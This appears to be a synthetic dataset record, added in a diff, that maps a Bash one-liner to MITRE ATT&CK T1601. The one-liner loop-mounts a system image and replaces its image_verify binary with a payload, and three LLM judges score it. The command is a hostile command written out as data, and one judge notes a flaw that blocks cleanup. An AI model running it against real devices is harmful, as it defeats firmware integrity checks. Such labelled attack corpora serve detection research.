@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && cp /mnt/img/usr/sbin/image_verify /tmp/image_verify.bak && install -m 0755 /opt/payloads/image_verify /mnt/img/usr/sbin/image_verify && diff -u /tmp/image_verify.bak /mnt/img/usr/sbin/image_verify && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Replaces the firmware verification binary within the system image and confirms the swap with diff, aligning with a strategy to weaken integrity checks.",
+  "rationale_steps": [
+    "Mount the tampered image to access system utilities.",
+    "Overwrite the image's verification binary with a modified one.",
+    "Use diff to confirm the binary in the system image has been replaced."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-0ebfa2d3",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with correct variable expansion, quoting, and valid options for losetup/mount/cp/install/diff, and proper && chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "It mounts a system image via loop, replaces the verification binary, and shows differences, aligning with T1601, but diff’s nonzero exit code in an && chain prevents cleanup and the operation requires root despite claiming no privilege.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:39:23.994823Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper use of &&, valid losetup/mount/install/diff/umount flags, and correct variable expansion including ${ld}p1 for partition reference.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by loop-mounting a modified system image, replacing the integrity verification binary with a malicious payload, confirming the swap with diff, and cleanly unmounting — directly subverting firmware integrity checks as described in the technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:25:14.441551Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash one-liner correctly uses command substitution, variable expansion, and logical operators with standard Linux utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The sequence of commands logically mounts a partitioned image file, replaces a security binary, and cleans up, perfectly illustrating T1601.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:25:18.233534Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
